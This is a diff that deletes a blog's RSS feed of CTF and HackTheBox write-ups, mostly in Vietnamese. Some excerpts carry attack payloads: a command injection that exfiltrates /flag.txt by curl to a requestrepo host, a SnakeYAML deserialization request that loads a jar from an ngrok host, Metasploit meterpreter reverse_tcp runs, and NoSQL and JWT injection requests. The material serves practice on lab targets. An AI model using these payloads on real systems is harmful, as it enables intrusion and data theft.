@@ -1,349 +1,0 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Write-ups on l3mnt2010&#39;s Blog</title>
-    <link>https://l3mnt2010.github.io/write-up/</link>
-    <description>Recent content in Write-ups on l3mnt2010&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <managingEditor>llam16219@gmail.com (l3mnt2010)</managingEditor>
-    <webMaster>llam16219@gmail.com (l3mnt2010)</webMaster>
-    <copyright>© l3mnt2010 Balogh 2021</copyright>
-    <lastBuildDate>Sun, 30 Aug 2020 18:17:00 +0700</lastBuildDate><atom:link href="https://l3mnt2010.github.io/write-up/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>[Attackdefense.com] Privilege Escalation</title>
-      <link>https://l3mnt2010.github.io/write-up/attackdefense.com-privilege-escalation/</link>
-      <pubDate>Sun, 30 Aug 2020 18:17:00 +0700</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/attackdefense.com-privilege-escalation/</guid>
-      <description>Link https://attackdefense.com/challengedetails?cid=2021
-Student to Teacher Find SUID binaries Using ‘Strings’ to view
-When we run the read-submission file. It will call and run the read-file. Read file is a binary file. We will use the PATH variable method
-First create another read-file executable file in / tmp with the content to generate a shell. Then use export to append the $ PATH variable. Then run the read-submission file. Because of the teacher’s suid, when running will generate the teacher’s shell:</description>
-    </item>
-    
-    <item>
-      <title>ACSCCTF2024 - WEB chall</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-03-30-acscctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-03-30-acscctf2024/</guid>
-      <description>WEB challs Login!   Bài này là một bài white box nên mình sẽ vào xem source code của nó luôn nha.
-  Bài cho file này thui:
-  const express = require(&#39;express&#39;);const crypto = require(&#39;crypto&#39;);const FLAG = process.env.FLAG || &#39;flag{this_is_a_fake_flag}&#39;;const app = express();app.use(express.urlencoded({ extended: true }));const USER_DB = {user: {username: &#39;user&#39;, password: crypto.randomBytes(32).toString(&#39;hex&#39;)},guest: {username: &#39;guest&#39;,password: &#39;guest&#39;}};app.</description>
-    </item>
-    
-    <item>
-      <title>AkasecCTF web chall ctf 2024 - solved challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-06-13-akasecctf2024-web-chall/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-06-13-akasecctf2024-web-chall/</guid>
-      <description>Hacker Community Flag: AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}
-Rusty Road poc:
-# import requests## register_url = &amp;quot;http://172.206.89.197:9080/register&amp;quot;# login_url = &amp;quot;http://172.206.89.197:9080/login&amp;quot;# alphabet = &amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&amp;amp;*()_+-=,./&amp;lt;&amp;gt;?:&amp;quot;# username = &amp;quot;lamdepchaiii&amp;quot;# PASSWORD = &amp;quot;M07H4F7H38167Hr33175JU57816M3&amp;quot;# index = 71# loop = 1## while True:# data_reg = {# &amp;quot;username&amp;quot;: username + &amp;quot;a&amp;quot; * loop,# &amp;quot;password&amp;quot;: &amp;quot;a&amp;quot; * index + &amp;quot;PASSWORD&amp;quot;# }## register_response = requests.post(register_url, data=data_reg)# if &amp;quot;Hello&amp;quot; in register_response.</description>
-    </item>
-    
-    <item>
-      <title>Bastard HTB</title>
-      <link>https://l3mnt2010.github.io/write-up/2025-01-03-bastard/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2025-01-03-bastard/</guid>
-      <description>Bastard (env) l3mnt2010@ASUSEXPERTBOOK:~/new/htb/Bastard$ ruby 44449.rb http://bastard.htb[*] --==[::#Drupalggedon2::]==----------------------------------------------------------------------------------[i] Target : http://bastard.htb/--------------------------------------------------------------------------------[+] Found : http://bastard.htb/CHANGELOG.txt (HTTP Response: 200)[+] Drupal!: v7.54--------------------------------------------------------------------------------[*] Testing: Form (user/password)[+] Result : Form valid- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[*] Testing: Clean URLs[+] Result : Clean URLs enabled--------------------------------------------------------------------------------[*] Testing: Code Execution (Method: name)[i] Payload: echo CQGHNWUY[+] Result : CQGHNWUY[+] Good News Everyone!</description>
-    </item>
-    
-    <item>
-      <title>Bi0sCTF 2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-01-28-bi0sctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-01-28-bi0sctf2024/</guid>
-      <description>WEB challs Image gallery 1 Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin
-Bắt đầu đi vào với file app.js
-Có thể thấy source là :
-const express = require(&#39;express&#39;);const cookieParser = require(&#39;cookie-parser&#39;);const fs = require(&#39;fs&#39;);const ejs = require(&#39;ejs&#39;);const path = require(&amp;quot;path&amp;quot;); const fileUpload = require(&#39;express-fileupload&#39;);const {randomUUID } = require(&amp;quot;crypto&amp;quot;);const { visit } = require(&#39;.</description>
-    </item>
-    
-    <item>
-      <title>BKSEC-CTF-2023 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2023-08-19-bksecctf2023/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2023-08-19-bksecctf2023/</guid>
-      <description>WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;amp;&amp;amp; !empty($_FILES)) {$uploadpath = &amp;quot;/var/tmp/&amp;quot;;$error = &amp;quot;&amp;quot;;$timestamp = time();$userValue = $_COOKIE[&#39;user&#39;];$target_file = $uploadpath . $userValue . &amp;quot;_&amp;quot; . $timestamp . &amp;quot;_&amp;quot; . $_FILES[&amp;quot;image&amp;quot;][&amp;quot;name&amp;quot;];move_uploaded_file($_FILES[&amp;quot;image&amp;quot;][&amp;quot;tmp_name&amp;quot;], $target_file);if ($_FILES[&amp;quot;image&amp;quot;][&amp;quot;size&amp;quot;] &amp;gt; 1048576) {$error .= &#39;&amp;lt;p class=&amp;quot;h5 text-danger&amp;quot;&amp;gt;Maximum file size is 1MB.&amp;lt;/p&amp;gt;&#39;;} elseif ($_FILES[&amp;quot;image&amp;quot;][&amp;quot;type&amp;quot;] !== &amp;quot;image/jpeg&amp;quot;) {$error .= &#39;&amp;lt;p class=&amp;quot;h5 text-danger&amp;quot;&amp;gt;Only JPG files are allowed.</description>
-    </item>
-    
-    <item>
-      <title>Cookie arena</title>
-      <link>https://l3mnt2010.github.io/write-up/2023-01-14-cookiearena/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2023-01-14-cookiearena/</guid>
-      <description>write up some chall (i solved all web &amp;rsquo;s challenges in this platform) Baby Ping Empty Execution  Tạo reversere shell để tiến hành đọc flag  Baby Crawler bypass escapeshellcmd: https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md
-Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail https://zacheller.dev/text-editor-jail
-https://b4d.sablun.org/blog/2020-02-16-247ctf-com-misc-the-text-editor-jail/
-Ping 0x01 Ping 0x02 https://forum.cookiearena.org/t/web-ping-0x01-ping-0x02-os-command-injection/164
-Youtube Downloader chỉ cần ;cat%20/flag.txt là được.
-The Existed File $(curl${IFS}-X${IFS}POST${IFS}--data${IFS}@/flag.txt${IFS}http://fvcwu3xj.requestrepo.com)
-Are you a search engine bot  Bài này mình sẽ sử dụng google bot để crawling tất cả những path ẩn https://www.</description>
-    </item>
-    
-    <item>
-      <title>CorCTF2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-07-27-corctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-07-27-corctf2024/</guid>
-      <description>WEB challs rock-paper-scissors [79 solves]  Một chall kéo - búa - bao với nodejs + redis để lưu số lần thắng của người chơi.  analysis  Ta sẽ đi vào phần tích các api của server:  import Redis from &#39;ioredis&#39;;import fastify from &#39;fastify&#39;;import fastifyStatic from &#39;@fastify/static&#39;;import fastifyJwt from &#39;@fastify/jwt&#39;;import fastifyCookie from &#39;@fastify/cookie&#39;;import { join } from &#39;node:path&#39;;import { randomBytes, randomInt } from &#39;node:crypto&#39;;const redis = new Redis(6379, &amp;quot;redis&amp;quot;);const app = fastify();const winning = new Map([[&#39;🪨&#39;, &#39;📃&#39;],[&#39;📃&#39;, &#39;✂️&#39;],[&#39;✂️&#39;, &#39;🪨&#39;]]);app.</description>
-    </item>
-    
-    <item>
-      <title>CtfZone2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-08-10-ctfzone2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-08-10-ctfzone2024/</guid>
-      <description>WEB challs web/0ld_b4t_g0ld Bài này là một bài black box tương đối đơn giản có chức năng reg + login -&amp;gt; sau khi login thì ta được chuyển đến một giao diện comment
-Sau khi comment thì sẽ hiển thị comment ở dưới:
-Quan sát api đã được gửi
-Vì thông tin đã bị escape nên khả năng là không xss được nên mình ngay lập tức nghĩ đến SSTI nhưng có vẻ không được để ý là api này version2 nên mình đổi thành version1 và may mắn nó vẫn có hoạt động</description>
-    </item>
-    
-    <item>
-      <title>Cyber Apocalypse 2024 - Solved &#39;s challenges in time</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-03-09-cyberapocalypse2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-03-09-cyberapocalypse2024/</guid>
-      <description>Cyber Apocalypse 2024: Hacker Royale with KCSC Flag Command     Đây là một bài client khá là dễ:
-    Để ý phần hàm
-  const fetchOptions = () =&amp;gt; {fetch(&#39;/api/options&#39;).then((data) =&amp;gt; data.json()).then((res) =&amp;gt; {availableOptions = res.allPossibleCommands;}).catch(() =&amp;gt; {availableOptions = undefined;})} Hàm gọi method get tới endpoint /api/options và trả về json, hãy xem thử  Như ta thấy thì có secret = Blip-blop, in a pickle with a hiccup!</description>
-    </item>
-    
-    <item>
-      <title>Devel HTB</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-12-02-develhtb/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-12-02-develhtb/</guid>
-      <description>Devel ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là .aspx
-tìm được bài khai thác với metasploit:
-https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/
-l3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118Connected to 10.129.243.118.220 Microsoft FTP ServiceName (10.129.243.118:l3mnt2010): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; ls229 Entering Extended Passive Mode (|||49158|)125 Data connection already open; Transfer starting.</description>
-    </item>
-    
-    <item>
-      <title>Google CTF 2024 - solved &#39;s challenges on time</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-06-23-googlectf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-06-23-googlectf2024/</guid>
-      <description>vsCTF 2024 ONLYECHO source :
-const readline = require(&#39;node:readline&#39;);const parse = require(&#39;bash-parser&#39;);const { exec } = require(&amp;quot;child_process&amp;quot;);const check = ast =&amp;gt; {if (typeof(ast) === &#39;string&#39;) {return true;}for (var prop in ast) {if (prop === &#39;type&#39; &amp;amp;&amp;amp; ast[prop] === &#39;Redirect&#39;) {return false;}if (prop === &#39;type&#39; &amp;amp;&amp;amp; ast[prop] === &#39;Command&#39;) {if (ast[&#39;name&#39;] &amp;amp;&amp;amp; ast[&#39;name&#39;][&#39;text&#39;] &amp;amp;&amp;amp; ast[&#39;name&#39;][&#39;text&#39;] != &#39;echo&#39;) {return false;}}if (!</description>
-    </item>
-    
-    <item>
-      <title>Hackthebox some easy machine</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-05-14-htb-machine/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-05-14-htb-machine/</guid>
-      <description>Hackthebox some easy machine POST /login HTTP/1.1Host: dev.stocker.htbUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/jsonContent-Length: 55Origin: http://dev.stocker.htbConnection: closeReferer: http://dev.stocker.htb/loginCookie: connect.sid=s%3AVKqxf1CbQcRK0LQcs4q8uXjL8AMGIYSf.hnzIXLK5fbo0Q7ZOe28EjtHvb%2BcXTeTsIpOeYTwHwsEUpgrade-Insecure-Requests: 1Priority: u=0, i{&amp;quot;username&amp;quot;: {&amp;quot;$ne&amp;quot;: null}, &amp;quot;password&amp;quot;: {&amp;quot;$ne&amp;quot;: null} }Chức năng cơ bản là ta có thể thêm đồ vào giỏ hàng sau đó sẽ order và click vào here ta sẽ thấy có một mẫu kiểu pdf để hiển thị thông tin các sản phẩm và giá -&amp;gt; nghĩ đến lỗi ssrf của file pdf</description>
-    </item>
-    
-    <item>
-      <title>Htb business ctf 2024 the vault of hope - solved challenges in time</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-05-18-htbbusinessctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-05-18-htbbusinessctf2024/</guid>
-      <description>Solved challenges Web/Jailbreak  Mở đầu các chall web bằng một bài black box khá đơn giản. Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.   Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống. Quan sát kĩ hơn bằng việc chặn proxy :    Post method với /api/update nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag Version.</description>
-    </item>
-    
-    <item>
-      <title>Htb web chall ctf 2024 - solved challenges - part 1</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-08-20-hackthebox-web-challpart1/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-08-20-hackthebox-web-challpart1/</guid>
-      <description>Hack the box Trapped Source  Đây là bài chỉ view source thôi   Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến /flag và nhận flag.   Correct pin là : 9661 nhận flag nào:  Flag : HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}
-Spookifier   Đây là một bài white box.
-  Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.</description>
-    </item>
-    
-    <item>
-      <title>Htb web chall ctf 2024 - solved challenges - part 2</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-08-21-hackthebox-web-challpart2/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-08-21-hackthebox-web-challpart2/</guid>
-      <description>Hack the box HauntMart  Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:  from flask import Flaskfrom application.blueprints.routes import web, apifrom application.database import mysqlfrom application.util import responseapp = Flask(__name__)app.config.from_object(&#39;application.config.Config&#39;)mysql.init_app(app)app.register_blueprint(web, url_prefix=&#39;/&#39;)app.register_blueprint(api, url_prefix=&#39;/api&#39;)@app.errorhandler(404)def not_found(error):return response(&#39;404 Not Found&#39;), 404@app.errorhandler(403)def forbidden(error):return response(&#39;403 Forbidden&#39;), 403@app.errorhandler(400)def bad_request(error):return response(&#39;400 Bad Request&#39;), 400@app.errorhandler(Exception)def handle_error(error):message = error.</description>
-    </item>
-    
-    <item>
-      <title>Htb web chall ctf 2024 - solved challenges - part 3</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-08-22-hackthebox-web-challpart3/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-08-22-hackthebox-web-challpart3/</guid>
-      <description>Hack the box Watersnake POST /update HTTP/1.1Host: 83.136.255.222:50084User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.136.255.222:50084/update.htmlContent-Type: multipart/form-data; boundary=---------------------------56413677111823040781259599420Content-Length: 322Origin: http://83.136.255.222:50084Connection: closePriority: u=0-----------------------------56413677111823040781259599420Content-Disposition: form-data; name=&amp;quot;config&amp;quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&amp;quot;http://0.tcp.ap.ngrok.io:11632/yaml-payload.jar&amp;quot;]]]]-----------------------------56413677111823040781259599420--flag: HTB{sn4k3_y4ml_d3s3r14lized_ftw!}
-link: https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/ poc: https://github.com/artsploit/yaml-payload/tree/master
-Lazy Ballot Couch [No sqli]  async loginUser(username, password) {const options = {selector: {username: username,password: password,},};const resp = await this.</description>
-    </item>
-    
-    <item>
-      <title>Htb web chall ctf 2024 - solved challenges - part 4</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-08-23-hackthebox-web-challpart4/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-08-23-hackthebox-web-challpart4/</guid>
-      <description>Hack the box (part4) - Medium Under Construction GET / HTTP/1.1Host: 94.237.49.212:43743User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://burpsuite/Connection: closeCookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBcUpgrade-Insecure-Requests: 1Priority: u=0, iflag: HTB{d0n7_3xp053_y0ur_publ1ck3y}
-breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.</description>
-    </item>
-    
-    <item>
-      <title>ImaginaryCTF2021</title>
-      <link>https://l3mnt2010.github.io/write-up/2021-07-23-imaginaryctf2021/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2021-07-23-imaginaryctf2021/</guid>
-      <description>ImaginaryCTF2021 ImaginaryCTF2021 WRITE UP</description>
-    </item>
-    
-    <item>
-      <title>Insomni&#39;hack2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-04-26-insomnihack2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-04-26-insomnihack2024/</guid>
-      <description>WEB challs InsoBank   Title : NextJs, Python, MySql, postgresSql, smart from u :3
-  The web application in this challenge is a banking app that supports transferring deposits from one account to another. However, all the accounts involved in a transfer operation must belong to the same person; this means we cannot transfer money from our account to other people’s accounts.   You must register with new account and login with your account   You only can transfer for 2 account provide by sever</description>
-    </item>
-    
-    <item>
-      <title>ISITDTU-CTF-2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-10-24-isitdtu-ctf-2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-10-24-isitdtu-ctf-2024/</guid>
-      <description>ISITDTU CTF 2024 my team RipeRice in the top 4
-web/Another one Source code: python flask + bug ujson + ssti template jinjja
-Trang web có chức năng đăng kí đăng nhập + hiển thị + render template nhưng không hiển thị kết quả
-Quan sát dockerfile ta thấy mạng để internal
-networks:internal:driver: bridgeServer đã xóa rm /usr/bin/wget và không có các câu lệnh có thể OOB, flag được random name nằm tại /app nên định hướng từ đầu có vẻ là rce.</description>
-    </item>
-    
-    <item>
-      <title>KCSC CTF 2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-05-13-kcscctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-05-13-kcscctf2024/</guid>
-      <description>WEB challs Bài Ka Tuổi Trẻ (200 points)  Đây là một bài của anh null001 với một đoạn code python khá ngắn  from flask import Flask, request, redirectfrom os import access, R_OK, statfrom os.path import isfile, join, normpathimport regexapp = Flask(__name__, static_url_path=&#39;/static&#39;, static_folder=&#39;static&#39;)@app.get(&#39;/&#39;)def home():if request.args.get(&#39;file&#39;):filename = join(&amp;quot;./static&amp;quot;, request.args.get(&#39;file&#39;))if isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &amp;lt; 1024 * 1024 * 2):try:with open(normpath(filename), &amp;quot;rb&amp;quot;) as file:if not regex.</description>
-    </item>
-    
-    <item>
-      <title>Lame HTB</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-12-02-lamehtb/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-12-02-lamehtb/</guid>
-      <description>Lame ta thấy dịch vụ vsftpd 2.3.4 có lỗ hổng rce trong metasploit -&amp;gt; nhưng không khai thác được -&amp;gt; ta chuyển qua khai khác service Samba smb
-https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
-l3mnt2010@ASUSEXPERTBOOK:~$ smbclient -L //10.129.243.28Password for [WORKGROUP\l3mnt2010]:Anonymous login successfulSharename Type Comment--------- ---- -------print$ Disk Printer Driverstmp Disk oh noes!opt DiskIPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian))ADMIN$ IPC IPC Service (lame server (Samba 3.</description>
-    </item>
-    
-    <item>
-      <title>Legacy HTB</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-12-02-legacyhtb/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-12-02-legacyhtb/</guid>
-      <description>Legacy Machine về window easy:
-135/tcpTrạng thái: OpenDịch vụ: Microsoft Windows RPCRPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.139/tcpTrạng thái: OpenDịch vụ: NetBIOS Session Service (netbios-ssn)Đây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp/tài nguyên.</description>
-    </item>
-    
-    <item>
-      <title>Optimum HTB</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-12-12-optimum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-12-12-optimum/</guid>
-      <description>Optimum ở đây ta thấy có port 80 mở chạy service web với version HttpFileServer httpd 2.3
-https://www.exploit-db.com/exploits/39161
-https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/
-msf6 &amp;gt; use exploit/windows/http/rejetto_hfs_exec[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/http/rejetto_hfs_exec) &amp;gt; set LHOST 10.10.14.12LHOST =&amp;gt; 10.10.14.12msf6 exploit(windows/http/rejetto_hfs_exec) &amp;gt; set LPORT 9997LPORT =&amp;gt; 9997msf6 exploit(windows/http/rejetto_hfs_exec) &amp;gt; set RHOSTS 10.129.243.140RHOSTS =&amp;gt; 10.129.243.140msf6 exploit(windows/http/rejetto_hfs_exec) &amp;gt; set PAYLOAD windows/meterpreter/reverse_tcpPAYLOAD =&amp;gt; windows/meterpreter/reverse_tcpmsf6 exploit(windows/http/rejetto_hfs_exec) &amp;gt; exploit[-] Handler failed to bind to 10.</description>
-    </item>
-    
-    <item>
-      <title>PopCorn HTB</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-12-10-popcornhtb/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-12-10-popcornhtb/</guid>
-      <description>Popcorn Có thể thấy là máy chủ mở 2 dịch vụ là ssh ở cổng 22 + Apache httpd 2.2.12 ở cổng 80.
-os: linux
-sau khi scan 1 lúc nhận được file php info trên cổng 80 chạy apache bật tính năng upload file.
-Creat python pty-tcp-backconnect sau khi register -&amp;gt; login ta thực hiện upload 1 file torren lên
-có thể thấy đã upload thành công -&amp;gt; tiếp theo ta có thể tải các tệp đính kèm lên:</description>
-    </item>
-    
-    <item>
-      <title>Root-me server side - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-11-14-root-me-server-side/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-11-14-root-me-server-side/</guid>
-      <description>Root-me server side HTML - Source code flag: nZ^&amp;amp;@q5&amp;amp;sjJHev0
-HTTP - IP restriction bypass Nếu người dùng trong mạng nội bộ của công ty thì không cần phải đăng nhập
